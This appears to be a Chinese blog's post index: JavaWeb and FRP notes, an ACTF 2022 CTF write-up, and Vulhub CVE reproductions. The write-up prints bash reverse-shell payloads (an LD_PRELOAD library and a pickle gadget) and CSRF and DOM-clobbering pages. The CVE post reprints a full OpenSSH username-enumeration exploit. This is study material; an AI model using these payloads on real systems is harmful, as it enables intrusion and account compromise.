\n\n","tags":["-Java"]},{"title":"JavaWeb入门","url":"/posts/84f639f6.html","content":"\n# JavaWeb\n\n### JDBC API\n\n快速入门\n\n1. 创建工程导入驱动jar包\n2. 注册驱动`Class.forName(\"com.mysql.jdbc.Driver\");`\n3. 获取链接`Connection conn= DriverManager.getConnection(url,username,password);`\n4. 准备sql语句`String sql=\"update nnn set id=5 where id=4\";`\n5. 获取执行sql对象Statement`Statement stmt=conn.createStatement();`\n6. 执行sql并获取返回内容`int count=stmt.executeUpdate(sql);`\n7. 关闭链接`stmt.close();conn.close();`\n\n### API详解\n\n##### DriverManager\n\n- 驱动管理类的作用\n  - 注册驱动\n  - 获取数据库的连接\n- 一些方法（都是静态方法）\n  - `getConnection()`尝试建立与给定数据库URL的连接\n    - url：jdbc:数据库类型://IP:端口/数据库名称?参数\n  - `registerDriver()`注册给定的驱动程序，上面mysql中的Driver类本质利用的还是这个函数\n\n##### Connection\n\n- 数据库连接对象的作用\n\n  - 获取执行SQL的对象\n  - 管理事务\n\n- 一些方法\n\n  - `Statement createStatement()`普通执行SQL对象\n  - `PreparedStatement preparedStatement(sql)`预编译SQL的执行SQL对象，防SQL注入\n    - 首先获取一个PreparedStatement对象，然后SQL语句中的参数值用?代替占位\n    - 进行`setxxx(参数1,参数2)`来给?赋值\n    - 直接执行无需再次穿参\n\n  - MySQL事务管理\n  - `setAutoCommit(boolen)`true为自动提交事务，false为手动提交事务，即为开启事务\n  - `commit()`提交事务\n  - `rollback()`回滚事务\n\n##### Statement\n\n- 作用：执行SQL语句\n- `int executeUpdate(sql)`执行DML，DDL语句，返回DML语句影响的行数，DDL语句执行后，执行成功也可能返回0\n- `ResultSet executeQuery(sql)`执行DQL语句，返回结果集对象\n- ResultSet\n  - `next()`光标向后移一位并判断是否有内容\n  - `gets数据类型(列名或列数)`获取当前光标指向的内容\n\n##### 数据库连接池\n\n- 为了保持数据库连接存在\n\n- 使用过程\n\n  1. 导入jar包\n\n  2. 定义配置文件，示例如下\n\n     ```\n     driverClassName=com.mysql.jc.jdbc.Driver\n     url=jdbc:mysql://127.0.0.1:3306/db1?characterEncoding=utf-8\n     username=root\n     password=123456\n     initialSize=5\n     maxActive=10\n     maxWait=5000\n     ```\n\n  3. 导入配置文件`Properties prop=new Properties();`\n\n     `prop.load(new FileInputStream(\"/Users/jlan/IdeaProjects/JavaWeb/jdbc-demo/src/druid.properties\"));`\n\n  4. 建立连接`DataSource dataSource= DruidDataSourceFactory.createDataSource(prop);`\n     `Connection connection=dataSource.getConnection();`\n\n##### Maven\n\n- Maven是专门用于管理和构建Java项目的攻击，它的主要功能有\n\n  - 提供了一套标准化的项目结构\n\n    - maven-project——项目名称\n      - src——源代码和测试代码目录\n        - main——源代码目录\n          - java——源代码Java文件目录\n          - resources——源代码配置文件目录\n          - webapp——web项目核心目录\n        - test——测试代码目录\n          - java——测试代码Java文件目录\n          - resources——测试代码配置文件目录\n        - pom.xml——项目核心配置文件\n\n  - 提供了一套标准化的构建流程\n\n    - 正常构建流程\n      - 编译，测试，打包，发布\n    - Maven提供一套命令来简单构建\n\n  - 提供了一套依赖管理机制\n\n    - 正常导入包流程\n\n      - 下载jar包\n      - 复制jar包到项目\n      - 导入jar包\n\n    - Maven导入包\n\n      - 更改pom.xml配置文件即可 \n\n        ```\n        \n        ```\n\n        \n\n- 使用Maven构建的项目结构完全一样，所有IDE创建的Maven项目可以通用\n\n- Maven的仓库\n\n  - 本地仓库：本地计算机上的一个目录\n  - 中央仓库：由Maven团队维护的全球唯一的仓库\n  - 远程仓库：一般是由公司搭建的私有仓库\n\n##### MyBatis\n\n- 是一款持久层（负责将数据保存到数据库的那一层代码）框架，用于简化JDBC开发\n- JDBC的缺点：硬编码，操作繁琐\n- MyBatis通过配置文件解决了硬编码和操作繁琐的问题，通过预先定义的配置文件来简化连接及处理结果集的工作\n\n##### Servlet\n\n- 第一个示例程序\n\n- ```java\n  //MyFirstServlet.java\n  package top.darkflow;\n  import javax.servlet.*;\n  import java.io.IOException;\n  import java.io.PrintWriter;\n  public class MyFirstServlet implements Servlet {\n      public void init(ServletConfig config) throws ServletException {\n          System.out.println(\"Init\");\n      }\n      public void service(ServletRequest request, ServletResponse response)\n              throws ServletException, IOException {\n          System.out.println(\"From service\");\n          PrintWriter out = response.getWriter();\n          out.println(\"Hello, Java Web.\");\n      }\n      public void destroy() {\n          System.out.println(\"Destroy\");\n      }\n      public String getServletInfo() {\n          return null;\n      }\n      public ServletConfig getServletConfig() {\n          return null;\n      }\n  }\n  ```\n\n- ```xml\n  <!--web.xml-->\n  <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <web-app version=\"2.4\" xmlns=\"http://java.sun.com/xml/ns/j2ee\"\n           xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n           xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee\n  http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\">\n      <servlet>\n          <servlet-name>MyFirstServletName</servlet-name>\n          <servlet-class>com.skyline.MyFirstServlet</servlet-class>\n      </servlet>\n      <servlet-mapping>\n          <servlet-name>MyFirstServletName</servlet-name>\n          <url-pattern>/hello</url-pattern>\n      </servlet-mapping>\n  </web-app>\n  ```\n\n- Web.xml文件的作用是告诉tomcat我们想要使用哪一个servlet来处理对应的请求，tomcat通过该文件来找到对应的servlet来完成请求及响应的过程\n\n- 将生成的class文件以及web.xml文件按照下面的目录结构放入webapps文件夹下\n\n- ```\n  webapps\n    - MyFirstServlet\n      - WEB-INF\n        - classes\n          - top\n            - darkflow\n              - MyFirstServlet.class\n        - web.xml\n  ```\n\n- 重启tomcat服务并访问/MyFirstServlet/hello就能看到内容啦\n\n##### JSP\n\n- 从上面的代码中可以看出，直接使用servlet生成网页，不仅代码写起来麻烦，可维护性也不高，为了把HTML中的这些非逻辑的部分抽离出，我们引入了JSP技术\n\n- JSP全称为JavaServer Pages，可以将其理解成一种高度抽象的servlet，在JSP运行期间实际上会被编译为servlet\n\n- 使用jsp我们只需要在WEB-INF旁创建一个jsp文件并写入代码即可\n\n- ```jsp\n  <!--test.jsp-->\n  <%@ page import=\"java.time.LocalDateTime\" %>\n  <html>\n  <body>\n  <h2>\n  <%\n  out.write(LocalDateTime.now().toString());\n  %>\n  </h2>\n  </body>\n  </html>\n  ```\n\n- 此时我们访问/MyFirstServlet/test.jsp即可\n\n- 一些语法\n\n  - `<% 代码片段 %>`等价于`<jsp:scriptlet> 代码片段 </jsp:scriptlet>`\n  - `<%! 一些变量声明 %>`等价于`<jsp:declaration> 代码片段 </jsp:declaration>`\n\n## Servlet\n\n配置文件web.xml的一个示例，通过配置文件来解析URL\n\n```xml\n<!DOCTYPE web-app PUBLIC\n        \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n        \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n    <servlet>\n        <servlet-name>downloadfile</servlet-name>\n        <servlet-class>top.darkflow.Fileget</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>downloadfile</servlet-name>\n        <url-pattern>/down</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n```\n\n文件下载\n\n```java\npublic class Fileget extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String path=(\"/Users/jlan/IdeaProjects/javaweb-02-servlet/response/src/main/1.png\");\n        System.out.println(\"下载文件路径为：\"+path);\n        String fileName=path.substring(path.lastIndexOf('/')+1);\n        resp.setHeader(\"Content-Disposition\",\"attachment:filename=\"+fileName);\n        FileInputStream in=new FileInputStream(path);\n        int len=0;\n        byte[] buffer = new byte[1024];\n        ServletOutputStream out=resp.getOutputStream();\n        while((len=in.read(buffer))>0){\n            out.write(buffer,0,len);\n        }\n        in.close();\n        out.close();\n    }\n}\n```\n\n获取POST参数\n\n```java\npublic class login extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        Enumeration<String> a=req.getParameterNames();\n        while(a.hasMoreElements()){\n            String paraName=a.nextElement();\n            System.out.println(paraName+\"=\"+req.getParameter(paraName));\n        }\n    }\n}\n```\n\n#### JSP\n\nJSP在编译的时候会被转换成一个Java类\n\n```\n//初始化\npubilc void _jspInit(){\n\n}\n//销毁\npublic void _jspDestory(){\n\n}\n//JSPService\npublic void _jspService()(HttpServletRequest request,HttpServletResponse response)\n```\n\nJSP作用\n\n判断请求\n\n内置的一些对象\n\n```java\nfinal javax.servlet.jsp.PageContext pageContext\t\t//页面上下文\n```\n\n# Spring\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"一些小小工具的使用","url":"/posts/78e6073f.html","content":"\n## FRP\n\n<!--more -->\n\n### FRPS（服务端配置）\n\n```\n#frps.ini\n[common]\nbind_port        = 7000                # 服务监听端口\nbind_addr        = 0.0.0.0             # 监听IP\ntoken            = 123456              # 密钥\n#以下为可选内容\ndashboard_port   = 7500                # web面板\ndashboard_user   = admin               # 面板用户名\ndashboard_pwd    = admin               # 面板密码\nsubdomain_host   = *.darkflow.top      # WEB访问域名绑定（绑定后只能绑定子域名访问）\nvhost_http_port  = 10000               # web服务http端口\nvhost_https_port = 10001               # web服务https端口\n```\n\n### FRPC（客户端配置）\n\n```\n#frpc\n[common]\nserver_addr = 1.1.1.1             # 服务器IP或者地址\nserver_port = 7000                # 服务器提供的端口号\ntoken = 123456                    # 服务器提供的token\n#以下为不同服务通用配置模版\n[服务名]\ntype = tcp                        # 协议类型\nlocal_ip = 127.0.0.1              # 穿透的本地地址\nlocal_port = 5001                 # 穿透的本地端口\n[服务名]\ntype = http                       # 协议类型\nlocal_ip = 127.0.0.1              # 穿透的本地地址\nlocal_port = 80                   # 穿透的本地端口\ncustom_domains = frp.darkflow.top # 填写你的域名\n```\n"},{"title":"ACTF 2022","url":"/posts/1c461d7e.html","content":"\n# ACTF 2022\n\n~~和学长一起熬大夜做不出来题真是太爽🌶️，下次继续~~\n\n<!--more -->\n\n## gogogo\n\n是CVE，好耶\n\n[CVE-2017-17562](https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md)\n\n先写弹shell的so文件\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n__attribute__ ((__constructor__)) void aaanb(void)\n{\n    system(\"/bin/bash -c 'bash -i >& /dev/tcp/IP/端口 0>&1'\");\n}\n//gcc -shared -fPIC ./payload.c -o payload.so\n```\n\n将生成的so文件作为文件发送，并且在请求头中添加`LD_PRELOAD=/proc/self/fd/0`，由于题目是公共环境。需要对最后数字进行爆破\n\n## ToLeSion\n\n~~熬一晚上没做出来的题~~\n\n还是学到了很多东西的，先看题，curl访问链接，看了一下剩下的~~我认识的~~协议只有FTPS了，又题目中写了使用了memcached，外加题目环境是python，最终找到了[这个](https://blog.zeddyu.info/2021/05/19/tls-ctf/)，大概流程就是通过TLS复用，将payload放到TLS进行身份识别的SessionID的位置，导致非法的内容被注入到memcached中，然后更改sessionID将实现pickle反序列化来反弹shell\n\n本题具体流程如下\n\n- 首先伪造一个FTPS服务器，并且利用代理更改TLS中SessionID为我们的payload\n- 在受害者访问我们的FTPS服务器，通过被动连接的方式将数据链路的地址端口指向受害者本地的memcached服务\n- 此时受害者对数据链路进行TLS会话复用，将带有payload的TLS客户端请求发送到memcached服务，导致memcached命令执行，将我们构造的序列化内容写入到目标的memcached库中\n- 最后更改sessionID并重新访问网页，服务器取出序列化后内容反序列化，反弹shell\n\nOK上面的流程都已经懂了，那么我们怎么实现呢，首先是伪造服务器（来自学长的完整脚本）\n\n```python\nimport os\nimport pickle\nimport socketserver\nimport sys\n\nimport redis\nclass Test2(object):\n    def __reduce__(self):\n        cmd = \"bash -c 'exec bash -i &>/dev/tcp/IP/端口 <&1'\"\n        return (os.system,(cmd,))\npickle_code=pickle.dumps(Test2())\nprint(pickle_code)\nlength=len(pickle_code)\npayload=b\"\\r\\nset actfSession:J1an 0 0 \"+str(len(pickle_code)).encode()+b\"\\r\\n\"+pickle_code+b\"\\r\\n\"\ndef set_payload(payload):\n    r = redis.Redis(host='127.0.0.1', port=6379, db=0)\n    print('payload len: ', len(payload), file=sys.stderr)\n    r.set('payload', payload)\n    return payload\n\nprint(\"设置的sessionid为:\",set_payload(payload))\nprint(\"payload长度为:\",len(payload))\n\n\n\n\nclass MyTCPHandler(socketserver.StreamRequestHandler):\n    def handle(self):\n        print(0,'[+] connected', self.request, file=sys.stderr)\n        self.request.sendall(b'220 (vsFTPd 3.0.3)\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(1,self.data, file=sys.stderr,flush=True)\n        self.request.sendall(b'230 Login successful.\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(2,self.data, file=sys.stderr)\n        self.request.sendall(b'227 yolo\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(3,self.data, file=sys.stderr)\n        self.request.sendall(b'227 yolo\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(4,self.data, file=sys.stderr)\n        self.request.sendall(b'257 \"/\" is the current directory\\r\\n')\n# vps:importlib/a/b\n#         self.data = self.rfile.readline().strip().decode()\n#         print(5,self.data, file=sys.stderr)\n#         self.request.sendall(b'250 Directory successfully changed.\\r\\n')\n#\n#         self.data = self.rfile.readline().strip().decode()\n#         print(6,self.data, file=sys.stderr)\n#         self.request.sendall(b'250 Directory successfully changed.\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(7,self.data, file=sys.stderr)\n        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(8,self.data, file=sys.stderr)\n\n        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(9,self.data, file=sys.stderr)\n        self.request.sendall(b'200 Switching to Binary mode.\\r\\n')\n        # self.data = self.rfile.readline().strip().decode()\n        # # assert 'SIZE refs' == self.data, self.data\n        # self.finish()\n        # print(10,self.data, file=sys.stderr)\n        self.request.sendall(b'213 7\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(self.data, file=sys.stderr)\n        self.request.sendall(b'125 Data connection already open. Transfer starting.\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(self.data, file=sys.stderr)\n        self.request.sendall(b'250 Requested file action okay, completed.')\n        print(\"DIE.....\")\n        # exit()\n\n\nprint(\"使用端口:\",sys.argv[1])\n\nwith socketserver.TCPServer(('0.0.0.0', int(sys.argv[1])), MyTCPHandler) as server:\n    while True:\n        print(\"start...\")\n        server.handle_request()\n        open(\"stop\", \"w\").write(\"OK\")\n        print(\"END....\")\n        # exit()\n```\n\n首先启动TLS的代理服务器，使用[工具](https://github.com/ZeddYu/TLS-poison/)设置好了之后，导入证书私钥通过一下命令打开代理\n\n```\nTLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048\n```\n\n此时我们发往11211端口的带TLS的请求就会被解密并转发到2048端口，由于这个工具通过读取redis中的payload来传输数据，所以我们要先将payload存入redis，然后让受害者对我们服务器的11211端口发起FTPS请求，此时我们伪造的服务器会让受害者的服务器到127.0.0.1:11200去获取ftp传输的数据，进行TLS复用，数据被注入\n\n~~后面就是赛后复盘的了~~\n\n## beWhatYouWannaBe\n\n首先P1通过CSRF获取admin，并且此处的Token值可计算\n\n```javascript\nconst ValidateToken = (Token) => {\n    var sha256 = crypto.createHash('sha256');\n    return sha256.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex') === Token;\n}\napp.post('/beAdmin', (req, res) => {\n    if (req.session.user != 'admin') {\n        res.send(\"sorry, only admin can be admin\")\n        return\n    }\n    const username = req.body.username\n    const csrftoken = req.body.csrftoken\n    if (ValidateToken(csrftoken)) {\n        User.updateMany({ username: username }, { isAdmin: true },\n            (err, users) => {\n                if (err) {\n                    res.send('something error when being admin')\n                    return\n                }\n                if (users.length == 0) {\n                    res.send('no one can be admin')\n                } else {\n                    res.send('wow success wow')\n                }\n            }\n        )\n    } else {\n        res.send('validate error')3\n    }\n})\n```\n\n获取P1的js构造如下\n\n```html\n<form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\"> \n   \t<input name=\"username\" value=\"J1an\">\n   \t<input id=\"csrftoken\" name=\"csrftoken\" value=\"\"> \n</form>\n<script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js\"></script>\n<script>\n  \tvar a=CryptoJS.SHA256(Math.sin(Math.floor(Date.now() / 1000)).toString()).toString();\n \t\tcsrftoken.value=a;\n  \tform.submit();\n</script>\n```\n\n再来看P2\n\n```javascript\nawait page.setJavaScriptEnabled(false)\nawait page.goto(url, { timeout: 5000 })\nconst data = await page.evaluate((url, FLAG) => {\n    if (fff.lll.aaa.ggg.value == \"this_is_what_i_want\") {\n        return fetch(url + '?part2=' + btoa(encodeURIComponent(FLAG.substring(16))));\n    } else {\n        return fetch(url + '?there_is_no_flag')\n    }\n}, url, FLAG)\n```\n\n说白了就是构造一个html使得`fff.lll.aaa.ggg.value == \"this_is_what_i_want\"`，使用[这个](https://portswigger.net/research/dom-clobbering-strikes-back)小trick来嵌套构造元素，最终两者拼接构造出的html如下\n\n```html\n<html>\n<body>\n    <iframe name=fff srcdoc=\"<form id=lll name=aaa><input name=ggg value=this_is_what_i_want></form><form id=lll></form>\">\n    <form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\"> \n   \t<input name=\"username\" value=\"J1an\">\n   \t<input id=\"csrftoken\" name=\"csrftoken\" value=\"\"> \n</form>\n<script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js\"></script>\n<script>\n  \tvar a=CryptoJS.SHA256(Math.sin(Math.floor(Date.now() / 1000)).toString()).toString();\n \t\tcsrftoken.value=a;\n  \tform.submit();\n</script>\n</body>\n</html>\n```\n\n## poorui\n\n基本全是非预期吧，登录flag去找flagbot要就行了ss\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"JavaScript与Nodejs","url":"/posts/8f3824ff.html","content":"\n从头开始了属于是\n\n**变量声明**\n\n```javascript\nvar x=1;\nconsole.log(x);\n```\n\nfor循环与if判断与C++格式相同\n\n**对象**\n\n**BOM**\n\n- 浏览器对象模型\n- javascript将浏览器的各个组成部分封装成对象\n  - Window：浏览器窗口对象\n  - Navigator：浏览器对象\n  - Screen：屏幕对象\n  - History：历史记录对象\n    - history.back()后退\n    - history.forward()前进\n  - Location：地址栏对象\n    - location.href()设置或返回完整URL\n\n**DOM**\n\n- 文档对象模型\n- 将标记语言的各个部分封装成对象\n  - Document：整个文档对象\n  - Element：元素对象\n  - Attribute：属性对象\n  - Text：文本对象\n  - Comment：注释对象\n  - \n"},{"title":"CVE","url":"/posts/67caa546.html","content":"\n# CVE\n\n在Vulhub上面的CVE复现，一份小记录\n\n## OpenSSH\n\n### CVE-2018-15473\n\n漏洞内容：在OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，可以判断某个用户名是否存在于目标主机中\n\n漏洞作用：我们用弱口令、爆破等方式进行尝试登录时，ssh需要的用户名和账户名不管是一致还是不一致，都会给我们一个登录延迟的假象，让我们以为可以登录成功，实则不管你的用户名是否是正确的，它都会让你输入密码，然后告诉你登录失败，因此我们必须知道对方用户准确的用户名，让我们在接下来不管是弱口令登录还是暴力破解方面都很有帮助\n\n利用条件：OpenSSH 版本<7.7\n\n漏洞复现：\n\n1. 进入docker更改密码，此处改为`123456`\n\n2. ssh连接docker，查看`/etc/passwd`文件来查看用户名\n\n   ```\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   _apt:x:100:65534::/nonexistent:/bin/false\n   sshd:x:74:74:Privilege-separated SSH:/usr/local/sbin/sshd:/sbin/nologin\n   vulhub:x:1000:1000:,,,:/home/vulhub:/bin/bash\n   example:x:1001:1001:,,,:/home/example:/bin/bash\n   ```\n\n3. 测试exp\n\n   ```python\n   #!/usr/bin/env python\n   # python2 exp.py --port SSH端口 --userList 用户名字典 IP\n   ###########################################################################\n   #                ____                    _____ _____ _    _               #\n   #               / __ \\                  / ____/ ____| |  | |              #\n   #              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #\n   #              | |  | | '_ \\ / _ \\ '_ \\ \\___ \\\\___ \\|  __  |              #\n   #              | |__| | |_) |  __/ | | |____) |___) | |  | |              #\n   #               \\____/| .__/ \\___|_| |_|_____/_____/|_|  |_|              #\n   #                     | |               Username Enumeration              #\n   #                     |_|                                                 #\n   #                                                                         #\n   ###########################################################################\n   # Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #\n   # Vulnerability: CVE-2018-15473                                           #\n   # Affected Versions: OpenSSH version < 7.7                                #\n   # Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #\n   # Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #\n   # Email: Justin.Gardner@SynerComm.com                                     #\n   # Date: August 20, 2018                                                   #\n   ###########################################################################\n   \n   import argparse\n   import logging\n   import paramiko\n   import multiprocessing\n   import socket\n   import string\n   import sys\n   import json\n   from random import randint as rand\n   from random import choice as choice\n   # store function we will overwrite to malform the packet\n   old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]\n   \n   # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target\n   # with these 3 random usernames (there is an almost 0 possibility that they can be real ones)\n   random_username_list = []\n   # populate the list\n   for i in range(3):\n       user = \"\".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))\n       random_username_list.append(user)\n   \n   # create custom exception\n   class BadUsername(Exception):\n       def __init__(self):\n           pass\n   \n   # create malicious \"add_boolean\" function to malform packet\n   def add_boolean(*args, **kwargs):\n       pass\n   \n   # create function to call when username was invalid\n   def call_error(*args, **kwargs):\n       raise BadUsername()\n   \n   # create the malicious function to overwrite MSG_SERVICE_ACCEPT handler\n   def malform_packet(*args, **kwargs):\n       old_add_boolean = paramiko.message.Message.add_boolean\n       paramiko.message.Message.add_boolean = add_boolean\n       result  = old_parse_service_accept(*args, **kwargs)\n       #return old add_boolean function so start_client will work again\n       paramiko.message.Message.add_boolean = old_add_boolean\n       return result\n   \n   # create function to perform authentication with malformed packet and desired username\n   def checkUsername(username, tried=0):\n       sock = socket.socket()\n       sock.connect((args.hostname, args.port))\n       # instantiate transport\n       transport = paramiko.transport.Transport(sock)\n       try:\n           transport.start_client()\n       except paramiko.ssh_exception.SSHException:\n           # server was likely flooded, retry up to 3 times\n           transport.close()\n           if tried < 4:\n               tried += 1\n               return checkUsername(username, tried)\n           else:\n               print('[-] Failed to negotiate SSH transport')\n       try:\n           transport.auth_publickey(username, paramiko.RSAKey.generate(1024))\n       except BadUsername:\n               return (username, False)\n       except paramiko.ssh_exception.AuthenticationException:\n               return (username, True)\n       #Successful auth(?)\n       raise Exception(\"There was an error. Is this the correct version of OpenSSH?\")\n   \n   # function to test target system using the randomly generated usernames\n   def checkVulnerable():\n       vulnerable = True\n       for user in random_username_list:\n           result = checkUsername(user)\n           if result[1]:\n               vulnerable = False\n       return vulnerable\n   \n   def exportJSON(results):\n       data = {\"Valid\":[], \"Invalid\":[]}\n       for result in results:\n           if result[1] and result[0] not in data['Valid']:\n               data['Valid'].append(result[0])\n           elif not result[1] and result[0] not in data['Invalid']:\n               data['Invalid'].append(result[0])\n       return json.dumps(data)\n   \n   def exportCSV(results):\n       final = \"Username, Valid\\n\"\n       for result in results:\n           final += result[0]+\", \"+str(result[1])+\"\\n\"\n       return final\n   \n   def exportList(results):\n       final = \"\"\n       for result in results:\n           if result[1]:\n               final+=result[0]+\" is a valid user!\\n\"\n           else:\n               final+=result[0]+\" is not a valid user!\\n\"\n       return final\n   \n   # assign functions to respective handlers\n   paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet\n   paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error\n   \n   # get rid of paramiko logging\n   logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\n   \n   arg_parser = argparse.ArgumentParser()\n   arg_parser.add_argument('hostname', type=str, help=\"The target hostname or ip address\")\n   arg_parser.add_argument('--port', type=int, default=22, help=\"The target port\")\n   arg_parser.add_argument('--threads', type=int, default=5, help=\"The number of threads to be used\")\n   arg_parser.add_argument('--outputFile', type=str, help=\"The output file location\")\n   arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help=\"The output file location\")\n   group = arg_parser.add_mutually_exclusive_group(required=True)\n   group.add_argument('--username', type=str, help=\"The single username to validate\")\n   group.add_argument('--userList', type=str, help=\"The list of usernames (one per line) to enumerate through\")\n   args = arg_parser.parse_args()\n   \n   def main():\n       sock = socket.socket()\n       try:\n           sock.connect((args.hostname, args.port))\n           sock.close()\n       except socket.error:\n           print('[-] Connecting to host failed. Please check the specified host and port.')\n           sys.exit(1)\n   \n       # first we run the function to check if host is vulnerable to this CVE\n       if not checkVulnerable():\n           # most probably the target host is either patched or running a version not affected by this CVE\n           print(\"Target host most probably is not vulnerable or already patched, exiting...\")\n           sys.exit(0)\n       elif args.username: #single username passed in\n           result = checkUsername(args.username)\n           if result[1]:\n               print(result[0]+\" is a valid user!\")\n           else:\n               print(result[0]+\" is not a valid user!\")\n       elif args.userList: #username list passed in\n           try:\n               f = open(args.userList)\n           except IOError:\n               print(\"[-] File doesn't exist or is unreadable.\")\n               sys.exit(3)\n           usernames = map(str.strip, f.readlines())\n           f.close()\n           # map usernames to their respective threads\n           pool = multiprocessing.Pool(args.threads)\n           results = pool.map(checkUsername, usernames)\n           try:\n               if args.outputFile:\n                   outputFile = open(args.outputFile, \"w\")\n           except IOError:\n               print(\"[-] Cannot write to outputFile.\")\n               sys.exit(5)\n           if args.outputFormat=='json':\n               if args.outputFile:\n                   outputFile.writelines(exportJSON(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in JSON form.\")\n               else:\n                   print(exportJSON(results))\n           elif args.outputFormat=='csv':\n               if args.outputFile:\n                   outputFile.writelines(exportCSV(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in CSV form.\")\n               else:\n                   print(exportCSV(results))\n           else:\n               if args.outputFile:\n                   outputFile.writelines(exportList(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in List form.\")\n               else:\n                   print(exportList(results))\n       else: # no usernames passed in\n           print(\"[-] No usernames provided to check\")\n           sys.exit(4)\n   \n   if __name__ == '__main__':\n       main()\n   ```\n\n   此处我们还需要一个用户名字典，可以自行构造，也可以用github上面一个开源项目[SecLists](https://github.com/danielmiessler/SecLists/)，节约时间我们自行构造一个简短list，最终测试结果如下\n\n   ```\n   admin is not a valid user!\n   bin is a valid user!\n   sys is a valid user!\n   sync is a valid user!\n   games is a valid user!\n   man is a valid user!\n   lp is a valid user!\n   111 is not a valid user!\n   1243 is not a valid user!\n   sahdsa is not a valid user!\n   jalba is not a valid user!\n   dsa is not a valid user!\n   fe is not a valid user!\n   qf is not a valid user!\n   ds is not a valid user!\n   vc is not a valid user!\n   dsshg is not a valid user!\n   rsa is not a valid user!\n   grdfsbvfgd is not a valid user!\n   sb is not a valid user!\n   fgd is not a valid user!\n   s is not a valid user!\n   bgfd is not a valid user!\n   s is not a valid user!\n   g is not a valid user!\n   fds is not a valid user!\n   g is not a valid user!\n   fd is not a valid user!\n   sgf is not a valid user!\n   ds is not a valid user!\n   g is not a valid user!\n   fdsh is not a valid user!\n   tr is not a valid user!\n   wnbyrsbf is not a valid user!\n   dgs is not a valid user!\n   root is a valid user!\n   ```\n\n   显然漏洞存在，而当我们对高级版本的SSH进行测试时，exp失效\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png)\n\n## Samba（SMB）\n\n### CVE-2017-7494\n\n漏洞内容：只需要有一个可以写入文件的用户就可以提权到root权限\n\n漏洞作用：RCE\n\n影响范围：Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本\n\n漏洞复现：\n\n1. vulhub直接起一个docker\n\n2. 使用msf搜索对应漏洞`search is_known_pipename`\n\n3. 使用set命令设置rhost\n\n4. 